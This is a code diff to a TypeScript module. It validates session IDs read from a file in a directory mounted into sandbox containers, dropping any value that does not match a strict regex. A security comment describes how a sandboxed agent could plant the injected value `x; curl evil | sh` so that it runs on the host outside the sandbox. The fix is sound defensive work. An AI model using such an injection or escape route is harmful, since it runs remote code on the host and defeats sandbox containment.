@@ -34,8 +34,29 @@ export function deskSessionPath(token: string, peersDir: string = PEERS_DIR): st
 }
 
 /**
+ * Shape the core guarantees for a written session id: it passes through
+ * `sanitizeSessionId` (shared/peer-cache.ts), so it can only contain
+ * `[A-Za-z0-9-]` and is capped at 64 chars.
+ *
+ * SECURITY (CLAUDE.md hostile inputs #4/#5): the file this value comes from
+ * lives in a directory that is MOUNTED into sandbox containers, so its content
+ * must be treated as attacker-controlled. The adopted id later reaches the host
+ * shell as `--resume <id>`; without this check a sandboxed agent could write
+ * `x; curl evil | sh` into another tile's back-channel file and have it run
+ * OUTSIDE the sandbox. Anything not matching is dropped (the caller falls back
+ * to transcript discovery), never sanitized-and-used: a mangled id would resume
+ * the wrong conversation.
+ */
+const SESSION_ID_RE = /^[A-Za-z0-9-]{1,64}$/
+
+export function isPlausibleSessionId(value: string): boolean {
+  return SESSION_ID_RE.test(value)
+}
+
+/**
  * Read the real session id the core wrote for `token`, or null when the file is
- * absent/empty (older core, or the session has not registered yet). Best-effort.
+ * absent/empty/implausible (older core, session not registered yet, or a
+ * tampered file). Best-effort.
  */
 export function readDeskSessionId(token: string, peersDir: string = PEERS_DIR): string | null {
   if (!sanitizeToken(token)) return null
@@ -43,7 +64,8 @@ export function readDeskSessionId(token: string, peersDir: string = PEERS_DIR): 
     const full = deskSessionPath(token, peersDir)
     if (!existsSync(full)) return null
     const value = readFileSync(full, 'utf8').trim()
-    return value || null
+    if (!value) return null
+    return isPlausibleSessionId(value) ? value : null
   } catch {
     return null
   }
